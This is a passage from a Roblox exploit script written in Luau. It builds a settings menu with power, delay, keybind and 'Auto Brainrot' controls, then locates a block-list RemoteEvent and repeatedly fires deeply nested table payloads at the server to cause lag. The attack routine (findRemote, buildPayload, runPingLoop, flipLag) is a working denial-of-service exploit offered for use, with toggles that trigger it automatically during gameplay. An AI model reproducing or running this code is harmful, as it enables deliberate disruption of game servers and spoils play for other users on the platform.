setCloseBtn.MouseLeave:Connect(function() tw(setCloseBtn,{BackgroundColor3=Color3.fromRGB(20, 40, 20)},0.1) end)

local function mkInputRow(yPos, labelText, getValue, onConfirm)
	local row = Instance.new("Frame", settingsFrame)
	row.Size             = UDim2.new(1,-12,0,28)
	row.Position         = UDim2.new(0,6,0,yPos)
	row.BackgroundColor3 = C.card
	row.BorderSizePixel  = 0
	row.ZIndex           = 21
	Instance.new("UICorner", row).CornerRadius = UDim.new(0,8)
	local rs = Instance.new("UIStroke",row); rs.Color=C.glow; rs.Thickness=1

	local lbl = Instance.new("TextLabel", row)
	lbl.Size               = UDim2.new(0.45,0,1,0)
	lbl.Position           = UDim2.new(0,10,0,0)
	lbl.BackgroundTransparency = 1
	lbl.Text               = labelText
	lbl.TextColor3         = C.white
	lbl.Font               = Enum.Font.GothamBold
	lbl.TextSize           = 8
	lbl.TextXAlignment     = Enum.TextXAlignment.Left
	lbl.ZIndex             = 22

	local box = Instance.new("TextBox", row)
	box.Size               = UDim2.new(0,54,0,20)
	box.Position           = UDim2.new(1,-60,0.5,-10)
	box.BackgroundColor3   = C.inputBg
	box.BorderSizePixel    = 0
	box.Text               = tostring(getValue())
	box.TextColor3         = C.green1
	box.Font               = Enum.Font.GothamBold
	box.TextSize           = 9
	box.ClearTextOnFocus   = false
	box.ZIndex             = 23
	Instance.new("UICorner", box).CornerRadius = UDim.new(0,6)

	local bs = Instance.new("UIStroke",box); bs.Color=C.glow; bs.Thickness=1
	box.Focused:Connect(function() tw(bs,{Color=C.green3},0.12) end)
	box.FocusLost:Connect(function()
		tw(bs,{Color=C.glow},0.12)
		local n = tonumber(box.Text)
		if n then
			onConfirm(n)
			box.Text = tostring(getValue())
			saveConfig()
		else
			box.Text = tostring(getValue())
		end
	end)
	return box
end

local kbBindBtn, gpBindBtn

local function updateKbLabels()
	if kbBindBtn then
		if listeningFor == "kb" then
			kbBindBtn.Text = "Press..."
			kbBindBtn.TextColor3 = C.waiting
		else
			kbBindBtn.Text = cfg.keybindKb ~= "" and cfg.keybindKb or "None"
			kbBindBtn.TextColor3 = C.green1
		end
	end
	if gpBindBtn then
		if listeningFor == "gp" then
			gpBindBtn.Text = "Press..."
			gpBindBtn.TextColor3 = C.waiting
		else
			gpBindBtn.Text = cfg.keybindGp ~= "" and cfg.keybindGp or "None"
			gpBindBtn.TextColor3 = C.green1
		end
	end
end

local function mkKeybindRow(yPos, labelText, which)
	local row = Instance.new("Frame", settingsFrame)
	row.Size             = UDim2.new(1,-12,0,28)
	row.Position         = UDim2.new(0,6,0,yPos)
	row.BackgroundColor3 = C.card
	row.BorderSizePixel  = 0
	row.ZIndex           = 21
	Instance.new("UICorner", row).CornerRadius = UDim.new(0,8)
	local rs = Instance.new("UIStroke",row); rs.Color=C.glow; rs.Thickness=1

	local lbl = Instance.new("TextLabel", row)
	lbl.Size               = UDim2.new(0.4,0,1,0)
	lbl.Position           = UDim2.new(0,10,0,0)
	lbl.BackgroundTransparency = 1
	lbl.Text               = labelText
	lbl.TextColor3         = C.white
	lbl.Font               = Enum.Font.GothamBold
	lbl.TextSize           = 8
	lbl.TextXAlignment     = Enum.TextXAlignment.Left
	lbl.ZIndex             = 22

	local bindBtn = Instance.new("TextButton", row)
	bindBtn.Size             = UDim2.new(0,62,0,20)
	bindBtn.Position         = UDim2.new(1,-76,0.5,-10)
	bindBtn.BackgroundColor3 = C.inputBg
	bindBtn.BorderSizePixel  = 0
	bindBtn.AutoButtonColor  = false
	bindBtn.Font             = Enum.Font.GothamBold
	bindBtn.TextSize         = 9
	bindBtn.TextColor3       = C.green1
	bindBtn.ZIndex           = 23
	bindBtn.Text             = which == "kb" and cfg.keybindKb or cfg.keybindGp
	Instance.new("UICorner", bindBtn).CornerRadius = UDim.new(0,6)
	local bStr = Instance.new("UIStroke",bindBtn); bStr.Color=C.glow; bStr.Thickness=1

	bindBtn.MouseButton1Click:Connect(function()
		listeningFor = (listeningFor == which) and nil or which
		updateKbLabels()
	end)

	local clearBtn = Instance.new("TextButton", row)
	clearBtn.Size             = UDim2.new(0,20,0,20)
	clearBtn.Position         = UDim2.new(1,-24,0.5,-10)
	clearBtn.BackgroundColor3 = Color3.fromRGB(40, 15, 15)
	clearBtn.BorderSizePixel  = 0
	clearBtn.AutoButtonColor  = false
	clearBtn.Text             = "X"
	clearBtn.TextColor3       = C.red
	clearBtn.Font             = Enum.Font.GothamBlack
	clearBtn.TextSize         = 10
	clearBtn.ZIndex           = 23
	Instance.new("UICorner", clearBtn).CornerRadius = UDim.new(0,6)
	Instance.new("UIStroke",clearBtn).Color = C.red

	clearBtn.MouseButton1Click:Connect(function()
		if listeningFor == which then listeningFor = nil end
		if which == "kb" then cfg.keybindKb = "None" else cfg.keybindGp = "None" end
		updateKbLabels()
		saveConfig()
	end)

	if which == "kb" then kbBindBtn = bindBtn end
	if which == "gp" then gpBindBtn = bindBtn end
end

local autoBrainrotBtn
local function createBrainrotRow(yPos)
	local row = Instance.new("Frame", settingsFrame)
	row.Size             = UDim2.new(1,-12,0,28)
	row.Position         = UDim2.new(0,6,0,yPos)
	row.BackgroundColor3 = C.card
	row.BorderSizePixel  = 0
	row.ZIndex           = 21
	Instance.new("UICorner", row).CornerRadius = UDim.new(0,8)
	Instance.new("UIStroke",row).Color = C.glow

	local lbl = Instance.new("TextLabel", row)
	lbl.Size               = UDim2.new(0.7,0,1,0)
	lbl.Position           = UDim2.new(0,10,0,0)
	lbl.BackgroundTransparency = 1
	lbl.Text               = "Auto Brainrot"
	lbl.TextColor3         = C.white
	lbl.Font               = Enum.Font.GothamBold
	lbl.TextSize           = 8
	lbl.TextXAlignment     = Enum.TextXAlignment.Left
	lbl.ZIndex             = 22

	local toggleBtn = Instance.new("TextButton", row)
	toggleBtn.Size             = UDim2.new(0,42,0,20)
	toggleBtn.Position         = UDim2.new(1,-48,0.5,-10)
	toggleBtn.BackgroundColor3 = cfg.autoBrainrot and C.green2 or Color3.fromRGB(60,20,20)
	toggleBtn.BorderSizePixel  = 0
	toggleBtn.AutoButtonColor  = false
	toggleBtn.Text             = cfg.autoBrainrot and "ON" or "OFF"
	toggleBtn.TextColor3       = C.white
	toggleBtn.Font             = Enum.Font.GothamBlack
	toggleBtn.TextSize         = 9
	toggleBtn.ZIndex           = 23
	Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(1,0)
	Instance.new("UIStroke", toggleBtn).Color = C.glow

	toggleBtn.MouseButton1Click:Connect(function()
		cfg.autoBrainrot = not cfg.autoBrainrot
		toggleBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
		tw(toggleBtn, {BackgroundColor3 = cfg.autoBrainrot and C.green2 or Color3.fromRGB(60,20,20)}, 0.15)
		saveConfig()
	end)

	autoBrainrotBtn = toggleBtn
end

local Y = 34
local GAP = 4

local powerBox = mkInputRow(Y, "Power", function() return cfg.power end, function(v) cfg.power = math.max(1, v) end)
Y = Y + 28 + GAP
local intervalBox = mkInputRow(Y, "Delay (secs)", function() return cfg.interval end, function(v) cfg.interval = math.max(0.01, v) end)
Y = Y + 28 + GAP

createBrainrotRow(Y)
Y = Y + 28 + GAP

local div = Instance.new("Frame", settingsFrame)
div.Size             = UDim2.new(1,-16,0,1)
div.Position         = UDim2.new(0,8,0,Y)
div.BackgroundColor3 = C.glow
div.BorderSizePixel  = 0
div.BackgroundTransparency = 0.5
Y = Y + 8

local kbSectLbl = Instance.new("TextLabel", settingsFrame)
kbSectLbl.Size               = UDim2.new(1,-16,0,16)
kbSectLbl.Position           = UDim2.new(0,6,0,Y)
kbSectLbl.BackgroundTransparency = 1
kbSectLbl.Text               = "🦇 KEYBINDS"
kbSectLbl.TextColor3         = C.dim
kbSectLbl.Font               = Enum.Font.GothamBold
kbSectLbl.TextSize           = 7
kbSectLbl.TextXAlignment     = Enum.TextXAlignment.Left
Y = Y + 16

mkKeybindRow(Y, "Keyboard", "kb"); Y = Y + 28 + GAP
mkKeybindRow(Y, "Controller", "gp"); Y = Y + 28 + GAP

local settingsOpen = false
local function toggleSettings()
	settingsOpen = not settingsOpen
	if settingsOpen then
		settingsFrame.Visible = true
		settingsFrame.Size    = UDim2.new(0, SET_W, 0, 0)
		tw(settingsFrame, {Size=UDim2.new(0, SET_W, 0, SET_H)}, 0.2)
		tw(settingsBtn, {TextColor3=C.green1}, 0.12)
		powerBox.Text    = tostring(cfg.power)
		intervalBox.Text = tostring(cfg.interval)
		updateKbLabels()
	else
		listeningFor = nil
		updateKbLabels()
		tw(settingsFrame, {Size=UDim2.new(0, SET_W, 0, 0)}, 0.16)
		task.delay(0.18, function() settingsFrame.Visible = false end)
		tw(settingsBtn, {TextColor3=C.dim}, 0.12)
	end
end

settingsBtn.MouseButton1Click:Connect(toggleSettings)
setCloseBtn.MouseButton1Click:Connect(toggleSettings)

local function findRemote()
	local rrs = game:FindFirstChild("RobloxReplicatedStorage")
	if not rrs then return nil end
	local rem
	for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
		local r = rrs:FindFirstChild(name)
		if r and r:IsA("RemoteEvent") then rem = r break end
	end
	if not rem then
		for _, c in ipairs(rrs:GetChildren()) do
			if c:IsA("RemoteEvent") and c.Name:find("Block") then rem = c break end
		end
	end
	return rem
end

remote = findRemote()

local function buildPayload(power)
	local main = {}
	local nested = {{}}
	local current = nested[1]
	for _ = 1, 186 do
		local n = {}
		table.insert(current, n)
		current = n
	end
	local maxRep = math.min(math.floor(power / 188), 10000)
	for _ = 1, maxRep do
		table.insert(main, nested)
	end
	return main
end

local function runPingLoop()
	local delay = cfg.interval
	while active and remote do
		local payload = buildPayload(cfg.power)
		local ok = pcall(function() remote:FireServer(payload) end)
		if not ok then
			delay = math.min(delay * 1.5, 0.5)
		else
			delay = math.max(delay * 0.995, 0.05)
		end
		task.wait(delay)
	end
end

local function flipLag(state, isManual)
	active = state

	if isManual then
		if brainrotMode then manualOverride = not state else manualOverride = false end
	end

	if active then
		if not remote then remote = findRemote() end
		if not remote then active = false; flipLag(false); return end
		
		activateBtn.Text = "ACTIVATED"
		activateBtn.TextColor3 = C.white
		activateFrameStroke.Color = C.green1
		
		statusLbl.Text = "ACTIVE"
		statusLbl.TextColor3 = C.white
		statusPill.BackgroundColor3 = C.green2
		statusStroke.Color = C.white
		
		task.spawn(runPingLoop)
	else
		activateBtn.Text = "ACTIVATE"
		activateBtn.TextColor3 = C.green1
		activateFrameStroke.Color = Color3.fromRGB(20, 40, 20)
		
		statusLbl.Text = "READY"
		statusLbl.TextColor3 = C.green1
		statusPill.BackgroundColor3 = Color3.fromRGB(5, 30, 10)
		statusStroke.Color = C.green1
	end
end

activateBtn.MouseButton1Click:Connect(function() flipLag(not active, true) end)

RunService.Heartbeat:Connect(function()
	if not cfg.autoBrainrot then
		if brainrotMode then brainrotMode = false; lastBrainrotState = false end
		return
	end
	local char = plr.Character
	if not char then return end
	local hum = char:FindFirstChild("Humanoid")
	if not hum then return end

	local hasBrainrot = hum.WalkSpeed < 25

	if hasBrainrot and not lastBrainrotState then
		brainrotMode = true
		lastBrainrotState = true
		manualOverride = false
		flipLag(true)
	elseif not hasBrainrot and lastBrainrotState then
		brainrotMode = false
		lastBrainrotState = false
		manualOverride = false
		flipLag(false)
	end
end)

UserInputService.InputBegan:Connect(function(input, processed)
	local kc = input.KeyCode
	if kc == Enum.KeyCode.Unknown then return end
	local isGp = isGamepad(kc)
	local isKb = input.UserInputType == Enum.UserInputType.Keyboard

	if listeningFor then
		if kc == Enum.KeyCode.Escape then listeningFor = nil; updateKbLabels(); return end
		if listeningFor == "kb" and isKb and not BLACKLISTED[kc] then
			cfg.keybindKb = kc.Name; listeningFor = nil; updateKbLabels(); saveConfig()
			return
		end
		if listeningFor == "gp" and isGp then
			cfg.keybindGp = kc.Name; listeningFor = nil; updateKbLabels(); saveConfig()
			return
		end
		return
	end

	if processed then return end

	if kc == Enum.KeyCode.RightControl then
		mainFrame.Visible = not mainFrame.Visible
		if not mainFrame.Visible and settingsOpen then toggleSettings() end
		return
	end

	local kbEnum = resolveKb(cfg.keybindKb)
	local gpEnum = resolveKb(cfg.keybindGp)

	if (kbEnum and kc == kbEnum and isKb) or (gpEnum and kc == gpEnum and isGp) then
		flipLag(not active, true)
	end
end)

updateKbLabels()